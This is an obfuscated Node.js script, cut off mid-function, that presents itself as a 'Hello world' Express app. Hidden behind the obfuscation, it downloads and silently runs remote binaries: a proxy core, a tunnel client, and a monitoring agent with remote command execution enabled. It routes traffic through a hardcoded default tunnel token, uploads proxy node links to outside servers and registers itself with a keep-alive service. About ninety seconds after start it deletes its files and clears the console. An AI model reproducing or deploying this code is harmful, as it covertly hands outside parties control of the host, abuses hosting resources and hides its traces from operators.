const _0x2625d0=_0x5689;(function(_0x13ffc9,_0x45c0ca){const _0x15ac36=_0x5689,_0x46cf24=_0x13ffc9();while(!![]){try{const _0xfb0ff3=parseInt(_0x15ac36(0x1c3))/0x1*(-parseInt(_0x15ac36(0x1f1))/0x2)+parseInt(_0x15ac36(0x1ad))/0x3+-parseInt(_0x15ac36(0x1a1))/0x4+-parseInt(_0x15ac36(0x17d))/0x5+-parseInt(_0x15ac36(0x1f9))/0x6+-parseInt(_0x15ac36(0x1ed))/0x7+-parseInt(_0x15ac36(0x1cf))/0x8*(-parseInt(_0x15ac36(0x189))/0x9);if(_0xfb0ff3===_0x45c0ca)break;else _0x46cf24['push'](_0x46cf24['shift']());}catch(_0x3aa8b2){_0x46cf24['push'](_0x46cf24['shift']());}}}(_0x4138,0x2186f));const express=require(_0x2625d0(0x20e)),app=express(),axios=require(_0x2625d0(0x1db)),os=require('os'),fs=require('fs'),path=require(_0x2625d0(0x1af)),{promisify}=require(_0x2625d0(0x1fc)),exec=promisify(require(_0x2625d0(0x174))[_0x2625d0(0x1bd)]),{execSync}=require(_0x2625d0(0x174)),UPLOAD_URL=process[_0x2625d0(0x1c4)][_0x2625d0(0x1b8)]||'',PROJECT_URL=process[_0x2625d0(0x1c4)][_0x2625d0(0x213)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x2625d0(0x1c6)]||_0x2625d0(0x182),SUB_PATH=process['env'][_0x2625d0(0x1e6)]||_0x2625d0(0x1f0),PORT=process['env'][_0x2625d0(0x1ba)]||process[_0x2625d0(0x1c4)][_0x2625d0(0x1c1)]||0xbb8,UUID=process[_0x2625d0(0x1c4)]['UUID']||_0x2625d0(0x20d),NEZHA_SERVER=process[_0x2625d0(0x1c4)][_0x2625d0(0x227)]||'',NEZHA_PORT=process[_0x2625d0(0x1c4)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x2625d0(0x1be)]||'',ARGO_DOMAIN=process[_0x2625d0(0x1c4)][_0x2625d0(0x21b)]||'7307.shi.ddns-ip.net',ARGO_AUTH=process[_0x2625d0(0x1c4)][_0x2625d0(0x1df)]||_0x2625d0(0x18b),ARGO_PORT=process[_0x2625d0(0x1c4)][_0x2625d0(0x176)]||0x1f41,CFIP=process[_0x2625d0(0x1c4)][_0x2625d0(0x1dc)]||'cdns.doon.eu.org',CFPORT=process[_0x2625d0(0x1c4)][_0x2625d0(0x1de)]||0x1bb,NAME=process['env'][_0x2625d0(0x1fb)]||_0x2625d0(0x1e2);!fs[_0x2625d0(0x1b1)](FILE_PATH)?(fs[_0x2625d0(0x17a)](FILE_PATH),console[_0x2625d0(0x219)](FILE_PATH+'\x20is\x20created')):console[_0x2625d0(0x219)](FILE_PATH+_0x2625d0(0x1ec));function generateRandomName(){const _0x59394a=_0x2625d0,_0x22fb5b=_0x59394a(0x1a2);let _0x3f79aa='';for(let _0x1c714e=0x0;_0x1c714e<0x6;_0x1c714e++){_0x3f79aa+=_0x22fb5b['charAt'](Math[_0x59394a(0x19e)](Math[_0x59394a(0x1c9)]()*_0x22fb5b['length']));}return _0x3f79aa;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2625d0(0x19f)](FILE_PATH,npmName),phpPath=path[_0x2625d0(0x19f)](FILE_PATH,phpName),webPath=path[_0x2625d0(0x19f)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x2625d0(0x20f)),bootLogPath=path[_0x2625d0(0x19f)](FILE_PATH,_0x2625d0(0x1b0)),configPath=path[_0x2625d0(0x19f)](FILE_PATH,'config.json');function _0x4138(){const _0x3ed77d=['forEach','mkdirSync','text/plain;\x20charset=utf-8','response','461505dLedMn','fileUrl','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','config.yaml','firefox','./tmp','\x20>/dev/null\x202>&1\x20&','&path=%2Fvless-argo%3Fed%3D2560#','arch','Subscription\x20uploaded\x20successfully','match','/dev/null','9eVUVWU','\x20-p\x20','eyJhIjoiYmZkYmZjODllYzI5OTJmOWMzNzE4OWJhNGVjMjc5MjUiLCJ0IjoiMDUzY2QzNzktZjE1Yy00YzA0LWE5ZjQtMzFkN2ZjMTlmYjk4IiwicyI6IlpqSXlabU13TlRjdFl6YzRaaTAwTnpGakxXRXpNMll0WTJZNVpEUXdPR1kxWXpBeCJ9','ARGO_DOMAIN:','tunnel.json','/vmess-argo','Empowerment\x20success\x20for\x20','listen','filter','Hello\x20world!','stringify','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','country_code','message','/trojan-argo','https://amd64.ssss.nyc.mn/web','pipe','/tunnel.yml\x20run','clear','chmod','vmess','floor','join','Unknown','979908uRqLnC','abcdefghijklmnopqrstuvwxyz','2083','\x20failed:\x20','isFile','tunnel.yml','direct','http://ip-api.com/json/','writeFileSync','vless','Empowerment\x20failed\x20for\x20','tls','17829PiALBL','Error\x20reading\x20boot.log:','path','boot.log','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','catch','fileName','none','true','UPLOAD_URL','&fp=firefox&type=ws&host=','SERVER_PORT','https://amd64.ssss.nyc.mn/v1','aarch64','exec','NEZHA_KEY','utf-8','Add\x20automatic\x20access\x20task\x20faild:\x20','PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','19vfUhxv','env','\x20-c\x20\x22','FILE_PATH','Error\x20executing\x20command:\x20','org','random','readdirSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ArgoDomain:','toString','substring','6944728ENxzYN','split','platform','https://arm64.ssss.nyc.mn/v1','\x0a\x0avmess://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','base64','Unhandled\x20error\x20in\x20startserver:','rm\x20-rf\x20','\x0a\x0atrojan://','from','taskkill\x20/f\x20/im\x20','axios','CFIP','https://oooo.serv00.net/add-url','CFPORT','ARGO_AUTH','status','https://ipapi.co/json/','shiyan','127.0.0.1','del\x20/f\x20/q\x20','Content-Type','SUB_PATH','stream','2096','arm','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/bot','\x20already\x20exists','469175cyRTfF','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vless-argo','sub','12554ldZIHS','?security=tls&sni=','443','basename','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tcp','trojan','then','1278846eFlEnD','config.json','NAME','util','2053','unlink','finish','/config.json\x20>/dev/null\x202>&1\x20&','\x20is\x20running','arm64','createWriteStream','success','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Download\x20','unlinkSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','8443','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','http','has','d9e4d0c1-5d91-448a-bc6e-fbb67d0300c5','express','list.txt','error','nohup\x20','charAt','PROJECT_URL','App\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','close','automatic\x20access\x20task\x20added\x20successfully','log','win32','ARGO_DOMAIN','readFileSync','\x0avless://','--tls','map','get','quic','freedom','push','\x0a\x20\x20\x20\x20','/api/delete-nodes','https://arm64.ssss.nyc.mn/web','NEZHA_SERVER','length','data','includes','npm\x20running\x20error:\x20','web\x20running\x20error:\x20','https+local://8.8.8.8/dns-query','application/json','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0aclient_secret:\x20','php\x20running\x20error:\x20','/sub.txt\x20saved\x20successfully','\x22\x20>\x20/dev/null\x202>&1','unshift','post','statSync','/vmess-argo?ed=2560','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20tunnel:\x20','child_process','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_PORT','\x0a\x20\x20credentials-file:\x20','countryCode'];_0x4138=function(){return _0x3ed77d;};return _0x4138();}function deleteNodes(){const _0x511407=_0x2625d0;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3f46d7;try{_0x3f46d7=fs[_0x511407(0x21c)](subPath,'utf-8');}catch{return null;}const _0x2e02a0=Buffer['from'](_0x3f46d7,_0x511407(0x1d5))[_0x511407(0x1cd)]('utf-8'),_0x47e6a1=_0x2e02a0['split']('\x0a')[_0x511407(0x191)](_0x4e1393=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4e1393));if(_0x47e6a1[_0x511407(0x228)]===0x0)return;return axios[_0x511407(0x16e)](UPLOAD_URL+_0x511407(0x225),JSON[_0x511407(0x193)]({'nodes':_0x47e6a1}),{'headers':{'Content-Type':'application/json'}})[_0x511407(0x1b4)](_0x49c4ee=>{return null;}),null;}catch(_0x558c0d){return null;}}function cleanupOldFiles(){const _0x2d6a88=_0x2625d0;try{const _0x22c105=fs[_0x2d6a88(0x1ca)](FILE_PATH);_0x22c105['forEach'](_0x2e248f=>{const _0x42be16=_0x2d6a88,_0x2d803f=path[_0x42be16(0x19f)](FILE_PATH,_0x2e248f);try{const _0x148025=fs[_0x42be16(0x16f)](_0x2d803f);_0x148025[_0x42be16(0x1a5)]()&&fs[_0x42be16(0x207)](_0x2d803f);}catch(_0x59da5b){}});}catch(_0x35b2b1){}}app[_0x2625d0(0x220)]('/',function(_0x491507,_0x3344dd){const _0x40e9b0=_0x2625d0;_0x3344dd['send'](_0x40e9b0(0x192));});async function generateConfig(){const _0x4e034e=_0x2625d0,_0x280bdd={'log':{'access':_0x4e034e(0x188),'error':_0x4e034e(0x188),'loglevel':_0x4e034e(0x1b6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4e034e(0x1aa),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4e034e(0x1b6),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4e034e(0x1e3),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4e034e(0x1b6)},'streamSettings':{'network':_0x4e034e(0x1f6),'security':'none'}},{'port':0xbba,'listen':_0x4e034e(0x1e3),'protocol':_0x4e034e(0x1aa),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4e034e(0x1b6)},'streamSettings':{'network':'ws','security':_0x4e034e(0x1b6),'wsSettings':{'path':_0x4e034e(0x1ef)}},'sniffing':{'enabled':!![],'destOverride':[_0x4e034e(0x20b),_0x4e034e(0x1ac),_0x4e034e(0x221)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4e034e(0x1e3),'protocol':_0x4e034e(0x19d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4e034e(0x18e)}},'sniffing':{'enabled':!![],'destOverride':[_0x4e034e(0x20b),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4e034e(0x1e3),'protocol':_0x4e034e(0x1f7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4e034e(0x197)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4e034e(0x1ac),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4e034e(0x22d)]},'outbounds':[{'protocol':_0x4e034e(0x222),'tag':_0x4e034e(0x1a7)},{'protocol':'blackhole','tag':'block'}]};fs[_0x4e034e(0x1a9)](path[_0x4e034e(0x19f)](FILE_PATH,_0x4e034e(0x1fa)),JSON[_0x4e034e(0x193)](_0x280bdd,null,0x2));}function _0x5689(_0x3d4d92,_0x7a5792){_0x3d4d92=_0x3d4d92-0x16c;const _0x413853=_0x4138();let _0x5689ff=_0x413853[_0x3d4d92];return _0x5689ff;}function getSystemArchitecture(){const _0x24a874=_0x2625d0,_0x44a4c2=os[_0x24a874(0x185)]();return _0x44a4c2===_0x24a874(0x1e9)||_0x44a4c2===_0x24a874(0x202)||_0x44a4c2===_0x24a874(0x1bc)?_0x24a874(0x1e9):'amd';}function downloadFile(_0x492503,_0x225a1c,_0x5cc78b){const _0x43296f=_0x2625d0,_0x3eea55=_0x492503;!fs[_0x43296f(0x1b1)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x8df99b=fs[_0x43296f(0x203)](_0x3eea55);axios({'method':_0x43296f(0x220),'url':_0x225a1c,'responseType':_0x43296f(0x1e7)})[_0x43296f(0x1f8)](_0x17d100=>{const _0xcfa440=_0x43296f;_0x17d100['data'][_0xcfa440(0x199)](_0x8df99b),_0x8df99b['on'](_0xcfa440(0x1ff),()=>{const _0x2157c7=_0xcfa440;_0x8df99b[_0x2157c7(0x217)](),console[_0x2157c7(0x219)](_0x2157c7(0x206)+path[_0x2157c7(0x1f4)](_0x3eea55)+'\x20successfully'),_0x5cc78b(null,_0x3eea55);}),_0x8df99b['on'](_0xcfa440(0x210),_0x144b6b=>{const _0x4283a8=_0xcfa440;fs[_0x4283a8(0x1fe)](_0x3eea55,()=>{});const _0x1730c2=_0x4283a8(0x206)+path[_0x4283a8(0x1f4)](_0x3eea55)+_0x4283a8(0x1a4)+_0x144b6b[_0x4283a8(0x196)];console[_0x4283a8(0x210)](_0x1730c2),_0x5cc78b(_0x1730c2);});})['catch'](_0x40077b=>{const _0x3617df=_0x43296f,_0x5b3a2b='Download\x20'+path[_0x3617df(0x1f4)](_0x3eea55)+'\x20failed:\x20'+_0x40077b[_0x3617df(0x196)];console['error'](_0x5b3a2b),_0x5cc78b(_0x5b3a2b);});}async function downloadFilesAndRun(){const _0x23b1f8=_0x2625d0,_0x2ab71c=getSystemArchitecture(),_0x3eb6d0=getFilesForArchitecture(_0x2ab71c);if(_0x3eb6d0[_0x23b1f8(0x228)]===0x0){console['log'](_0x23b1f8(0x208));return;}const _0x46dafb=_0x3eb6d0[_0x23b1f8(0x21f)](_0x5065d9=>{return new Promise((_0x1b19e6,_0xe8162)=>{const _0x4b5a36=_0x5689;downloadFile(_0x5065d9[_0x4b5a36(0x1b5)],_0x5065d9[_0x4b5a36(0x17e)],(_0x59e7aa,_0x2d1ad7)=>{_0x59e7aa?_0xe8162(_0x59e7aa):_0x1b19e6(_0x2d1ad7);});});});try{await Promise['all'](_0x46dafb);}catch(_0x547df3){console[_0x23b1f8(0x210)]('Error\x20downloading\x20files:',_0x547df3);return;}function _0x5df4b6(_0x132bc0){const _0xccec27=_0x23b1f8,_0xfb1f9e=0x1fd;_0x132bc0[_0xccec27(0x179)](_0x367e20=>{const _0x30f492=_0xccec27;fs[_0x30f492(0x1b1)](_0x367e20)&&fs[_0x30f492(0x19c)](_0x367e20,_0xfb1f9e,_0xede74d=>{const _0x9920d2=_0x30f492;_0xede74d?console[_0x9920d2(0x210)](_0x9920d2(0x1ab)+_0x367e20+':\x20'+_0xede74d):console[_0x9920d2(0x219)](_0x9920d2(0x18f)+_0x367e20+':\x20'+_0xfb1f9e[_0x9920d2(0x1cd)](0x8));});});}const _0x112a49=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5df4b6(_0x112a49);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x30260b=NEZHA_SERVER[_0x23b1f8(0x22a)](':')?NEZHA_SERVER[_0x23b1f8(0x1d0)](':')['pop']():'',_0x345296=new Set([_0x23b1f8(0x1f3),_0x23b1f8(0x209),_0x23b1f8(0x1e8),'2087','2083',_0x23b1f8(0x1fd)]),_0x542da7=_0x345296[_0x23b1f8(0x20c)](_0x30260b)?_0x23b1f8(0x1b7):'false',_0x3bcf0d=_0x23b1f8(0x230)+NEZHA_KEY+_0x23b1f8(0x216)+NEZHA_SERVER+_0x23b1f8(0x1d4)+_0x542da7+_0x23b1f8(0x1b3)+UUID;fs[_0x23b1f8(0x1a9)](path[_0x23b1f8(0x19f)](FILE_PATH,_0x23b1f8(0x180)),_0x3bcf0d);const _0x4abe6a=_0x23b1f8(0x211)+phpPath+_0x23b1f8(0x1c5)+FILE_PATH+_0x23b1f8(0x175);try{await exec(_0x4abe6a),console[_0x23b1f8(0x219)](phpName+_0x23b1f8(0x201)),await new Promise(_0x466d4d=>setTimeout(_0x466d4d,0x3e8));}catch(_0x1ad0f9){console[_0x23b1f8(0x210)](_0x23b1f8(0x231)+_0x1ad0f9);}}else{let _0x508854='';const _0x538b17=[_0x23b1f8(0x1f3),_0x23b1f8(0x209),'2096','2087',_0x23b1f8(0x1a3),'2053'];_0x538b17['includes'](NEZHA_PORT)&&(_0x508854=_0x23b1f8(0x21e));const _0x4c34a3='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x23b1f8(0x18a)+NEZHA_KEY+'\x20'+_0x508854+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4c34a3),console['log'](npmName+_0x23b1f8(0x201)),await new Promise(_0x3b4893=>setTimeout(_0x3b4893,0x3e8));}catch(_0x3f0e11){console[_0x23b1f8(0x210)](_0x23b1f8(0x22b)+_0x3f0e11);}}}else console[_0x23b1f8(0x219)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4e1c1c=_0x23b1f8(0x211)+webPath+'\x20-c\x20'+FILE_PATH+_0x23b1f8(0x200);try{await exec(_0x4e1c1c),console[_0x23b1f8(0x219)](webName+_0x23b1f8(0x201)),await new Promise(_0x478e3d=>setTimeout(_0x478e3d,0x3e8));}catch(_0x1ac271){console[_0x23b1f8(0x210)](_0x23b1f8(0x22c)+_0x1ac271);}if(fs[_0x23b1f8(0x1b1)](botPath)){let _0xca638d;if(ARGO_AUTH[_0x23b1f8(0x187)](/^[A-Z0-9a-z=]{120,250}$/))_0xca638d=_0x23b1f8(0x1c2)+ARGO_AUTH;else ARGO_AUTH[_0x23b1f8(0x187)](/TunnelSecret/)?_0xca638d=_0x23b1f8(0x20a)+FILE_PATH+_0x23b1f8(0x19a):_0xca638d=_0x23b1f8(0x1b2)+FILE_PATH+_0x23b1f8(0x17f)+ARGO_PORT;try{await exec(_0x23b1f8(0x211)+botPath+'\x20'+_0xca638d+_0x23b1f8(0x183)),console[_0x23b1f8(0x219)](botName+'\x20is\x20running'),await new Promise(_0x6fd799=>setTimeout(_0x6fd799,0x7d0));}catch(_0x1571aa){console[_0x23b1f8(0x210)](_0x23b1f8(0x1c7)+_0x1571aa);}}await new Promise(_0x2a7e00=>setTimeout(_0x2a7e00,0x1388));}function getFilesForArchitecture(_0x12f5b1){const _0x2b7a08=_0x2625d0;let _0x3a14b4;_0x12f5b1===_0x2b7a08(0x1e9)?_0x3a14b4=[{'fileName':webPath,'fileUrl':_0x2b7a08(0x226)},{'fileName':botPath,'fileUrl':_0x2b7a08(0x172)}]:_0x3a14b4=[{'fileName':webPath,'fileUrl':_0x2b7a08(0x198)},{'fileName':botPath,'fileUrl':_0x2b7a08(0x1eb)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x47123c=_0x12f5b1===_0x2b7a08(0x1e9)?'https://arm64.ssss.nyc.mn/agent':_0x2b7a08(0x1ea);_0x3a14b4[_0x2b7a08(0x16d)]({'fileName':npmPath,'fileUrl':_0x47123c});}else{const _0x4b45e1=_0x12f5b1===_0x2b7a08(0x1e9)?_0x2b7a08(0x1d2):_0x2b7a08(0x1bb);_0x3a14b4['unshift']({'fileName':phpPath,'fileUrl':_0x4b45e1});}}return _0x3a14b4;}function argoType(){const _0x12b834=_0x2625d0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x12b834(0x219)](_0x12b834(0x1ee));return;}if(ARGO_AUTH[_0x12b834(0x22a)]('TunnelSecret')){fs['writeFileSync'](path[_0x12b834(0x19f)](FILE_PATH,_0x12b834(0x18d)),ARGO_AUTH);const _0x546086=_0x12b834(0x173)+ARGO_AUTH[_0x12b834(0x1d0)]('\x22')[0xb]+_0x12b834(0x177)+path[_0x12b834(0x19f)](FILE_PATH,'tunnel.json')+_0x12b834(0x1cb)+ARGO_DOMAIN+_0x12b834(0x205)+ARGO_PORT+_0x12b834(0x22f);fs[_0x12b834(0x1a9)](path[_0x12b834(0x19f)](FILE_PATH,_0x12b834(0x1a6)),_0x546086);}else console[_0x12b834(0x219)](_0x12b834(0x215));}async function extractDomains(){const _0x2d4496=_0x2625d0;let _0x7f5d2e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x7f5d2e=ARGO_DOMAIN,console[_0x2d4496(0x219)](_0x2d4496(0x18c),_0x7f5d2e),await _0x17eabb(_0x7f5d2e);else try{const _0x28c5f6=fs[_0x2d4496(0x21c)](path['join'](FILE_PATH,_0x2d4496(0x1b0)),_0x2d4496(0x1bf)),_0x2aedaf=_0x28c5f6[_0x2d4496(0x1d0)]('\x0a'),_0x4e6098=[];_0x2aedaf[_0x2d4496(0x179)](_0x20c931=>{const _0x40aae4=_0x2d4496,_0x3ca2d6=_0x20c931[_0x40aae4(0x187)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3ca2d6){const _0x5b7e3e=_0x3ca2d6[0x1];_0x4e6098[_0x40aae4(0x223)](_0x5b7e3e);}});if(_0x4e6098[_0x2d4496(0x228)]>0x0)_0x7f5d2e=_0x4e6098[0x0],console[_0x2d4496(0x219)](_0x2d4496(0x1cc),_0x7f5d2e),await _0x17eabb(_0x7f5d2e);else{console[_0x2d4496(0x219)](_0x2d4496(0x194)),fs[_0x2d4496(0x207)](path[_0x2d4496(0x19f)](FILE_PATH,_0x2d4496(0x1b0)));async function _0x1c004f(){const _0x3bdda7=_0x2d4496;try{process[_0x3bdda7(0x1d1)]===_0x3bdda7(0x21a)?await exec(_0x3bdda7(0x1da)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x3bdda7(0x212)](0x0)+']'+botName[_0x3bdda7(0x1ce)](0x1)+_0x3bdda7(0x16c));}catch(_0xe57518){}}_0x1c004f(),await new Promise(_0x14b12e=>setTimeout(_0x14b12e,0xbb8));const _0x4882dd=_0x2d4496(0x1b2)+FILE_PATH+_0x2d4496(0x17f)+ARGO_PORT;try{await exec(_0x2d4496(0x211)+botPath+'\x20'+_0x4882dd+_0x2d4496(0x183)),console[_0x2d4496(0x219)](botName+'\x20is\x20running'),await new Promise(_0x40191b=>setTimeout(_0x40191b,0xbb8)),await extractDomains();}catch(_0x377452){console['error'](_0x2d4496(0x1c7)+_0x377452);}}}catch(_0x4cbf80){console[_0x2d4496(0x210)](_0x2d4496(0x1ae),_0x4cbf80);}async function _0x12beef(){const _0x20dffb=_0x2d4496;try{const _0x2f44b3=await axios[_0x20dffb(0x220)](_0x20dffb(0x1e1),{'timeout':0xbb8});if(_0x2f44b3[_0x20dffb(0x229)]&&_0x2f44b3[_0x20dffb(0x229)][_0x20dffb(0x195)]&&_0x2f44b3['data'][_0x20dffb(0x1c8)])return _0x2f44b3[_0x20dffb(0x229)][_0x20dffb(0x195)]+'_'+_0x2f44b3['data'][_0x20dffb(0x1c8)];}catch(_0x41cebe){try{const _0x23b6bb=await axios[_0x20dffb(0x220)](_0x20dffb(0x1a8),{'timeout':0xbb8});if(_0x23b6bb[_0x20dffb(0x229)]&&_0x23b6bb['data'][_0x20dffb(0x1e0)]===_0x20dffb(0x204)&&_0x23b6bb[_0x20dffb(0x229)]['countryCode']&&_0x23b6bb[_0x20dffb(0x229)][_0x20dffb(0x1c8)])return _0x23b6bb[_0x20dffb(0x229)][_0x20dffb(0x178)]+'_'+_0x23b6bb[_0x20dffb(0x229)][_0x20dffb(0x1c8)];}catch(_0x1ca0d3){}}return _0x20dffb(0x1a0);}async function _0x17eabb(_0x55eb0e){const _0x4e2735=await _0x12beef(),_0x4f9279=NAME?NAME+'-'+_0x4e2735:_0x4e2735;return new Promise(_0x5fecce=>{setTimeout(()=>{const _0x3e1234=_0x5689,_0x164543={'v':'2','ps':''+_0x4f9279,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3e1234(0x1b6),'net':'ws','type':_0x3e1234(0x1b6),'host':_0x55eb0e,'path':_0x3e1234(0x170),'tls':_0x3e1234(0x1ac),'sni':_0x55eb0e,'alpn':'','fp':_0x3e1234(0x181)},_0x44b8e4=_0x3e1234(0x21d)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x55eb0e+_0x3e1234(0x1b9)+_0x55eb0e+_0x3e1234(0x184)+_0x4f9279+_0x3e1234(0x1d3)+Buffer[_0x3e1234(0x1d9)](JSON[_0x3e1234(0x193)](_0x164543))['toString'](_0x3e1234(0x1d5))+_0x3e1234(0x1d8)+UUID+'@'+CFIP+':'+CFPORT+_0x3e1234(0x1f2)+_0x55eb0e+_0x3e1234(0x1b9)+_0x55eb0e+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4f9279+_0x3e1234(0x224);console['log'](Buffer['from'](_0x44b8e4)[_0x3e1234(0x1cd)](_0x3e1234(0x1d5))),fs['writeFileSync'](subPath,Buffer[_0x3e1234(0x1d9)](_0x44b8e4)['toString']('base64')),console[_0x3e1234(0x219)](FILE_PATH+_0x3e1234(0x232)),uploadNodes(),app[_0x3e1234(0x220)]('/'+SUB_PATH,(_0x49643f,_0x30830d)=>{const _0x4a5407=_0x3e1234,_0x27a705=Buffer[_0x4a5407(0x1d9)](_0x44b8e4)['toString']('base64');_0x30830d['set'](_0x4a5407(0x1e5),_0x4a5407(0x17b)),_0x30830d['send'](_0x27a705);}),_0x5fecce(_0x44b8e4);},0x7d0);});}}async function uploadNodes(){const _0x451f5e=_0x2625d0;if(UPLOAD_URL&&PROJECT_URL){const _0x553ab1=PROJECT_URL+'/'+SUB_PATH,_0x326a54={'subscription':[_0x553ab1]};try{const _0x5d4b50=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x326a54,{'headers':{'Content-Type':'application/json'}});return _0x5d4b50&&_0x5d4b50[_0x451f5e(0x1e0)]===0xc8?(console[_0x451f5e(0x219)](_0x451f5e(0x186)),_0x5d4b50):null;}catch(_0x454966){if(_0x454966[_0x451f5e(0x17c)]){if(_0x454966[_0x451f5e(0x17c)][_0x451f5e(0x1e0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x46649c=fs[_0x451f5e(0x21c)](listPath,'utf-8'),_0x2c1ac0=_0x46649c[_0x451f5e(0x1d0)]('\x0a')['filter'](_0x1c1bba=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1c1bba));if(_0x2c1ac0[_0x451f5e(0x228)]===0x0)return;const _0x30ac2a=JSON[_0x451f5e(0x193)]({'nodes':_0x2c1ac0});try{const _0x31fb5c=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x30ac2a,{'headers':{'Content-Type':_0x451f5e(0x22e)}});return _0x31fb5c&&_0x31fb5c[_0x451f5e(0x1e0)]===0xc8?(console[_0x451f5e(0x219)]('Nodes\x20uploaded\x20successfully'),_0x31fb5c):null;}catch(_0x3d39e3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3a281a=_0x5689,_0x4df34e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4df34e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4df34e[_0x3a281a(0x223)](phpPath);process[_0x3a281a(0x1d1)]===_0x3a281a(0x21a)?exec(_0x3a281a(0x1e4)+_0x4df34e[_0x3a281a(0x19f)]('\x20')+'\x20>\x20nul\x202>&1',_0x2d3477=>{const _0x267f4f=_0x3a281a;console['clear'](),console[_0x267f4f(0x219)](_0x267f4f(0x214)),console[_0x267f4f(0x219)](_0x267f4f(0x1f5));}):exec(_0x3a281a(0x1d7)+_0x4df34e['join']('\x20')+_0x3a281a(0x171),_0x2c3ace=>{const _0xedaad0=_0x3a281a;console[_0xedaad0(0x19b)](),console[_0xedaad0(0x219)](_0xedaad0(0x214)),console[_0xedaad0(0x219)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2000a6=_0x2625d0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2000a6(0x219)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x14ebd8=await axios[_0x2000a6(0x16e)](_0x2000a6(0x1dd),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2000a6(0x22e)}});return console[_0x2000a6(0x219)](_0x2000a6(0x218)),_0x14ebd8;}catch(_0x23c251){return console[_0x2000a6(0x210)](_0x2000a6(0x1c0)+_0x23c251['message']),null;}}async function startserver(){const 